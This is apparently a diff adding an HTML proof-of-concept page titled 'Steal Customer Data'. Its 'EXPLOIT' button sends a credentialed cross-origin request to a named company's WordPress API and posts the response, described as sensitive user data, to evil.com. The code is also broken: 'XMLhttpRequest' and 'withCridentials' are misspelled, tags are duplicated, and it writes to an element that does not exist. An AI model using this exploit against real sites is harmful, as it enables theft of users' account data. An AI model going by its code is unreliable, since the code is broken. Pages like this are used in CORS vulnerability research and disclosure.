@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Steal Customer Data</title>
+    <style>
+        /* Style for the inline button */
+        .inline-button {
+            display: inline-block;
+            padding: 10px 100px;
+            font-size: 16px;
+            text-align: center;
+            border-radius: 20px;
+            background-color: #007bff;
+            color: #ffffff;
+            text-decoration: none;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            color: black;
+            font-size: large;
+            font-weight: 700;
+        }
+    
+        /* Hover effect */
+        .inline-button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+    </head>
+    <body>
+</head>
+<body>
+    <button type="button" onclick="cors()" class="inline-button" >EXPLOIT</button>
+    <script>
+    function cors(){
+        var xhttp = new XMLhttpRequest();
+        xhttp.onreadystatechange = function(){
+            if(this.readyState == 4 && this.status == 200) {
+                var a = this.responseText ; // Sensitive data from user account
+                document.getElementById("demo").innerHTML =a;
+                xhttp.open("POST","http://evil.com",true);// Sending that data to Attacker's website
+                console.log(a);
+                xhttp.send("data ="+a);
+            }
+        };
+        xhttp.open("POST","http://backend.blog.nubank.com.br/wp-json/",true);
+        xhttp.withCridentials = true;
+        xhttp.send();
+    }
+    </script>
+</body>
+</html>
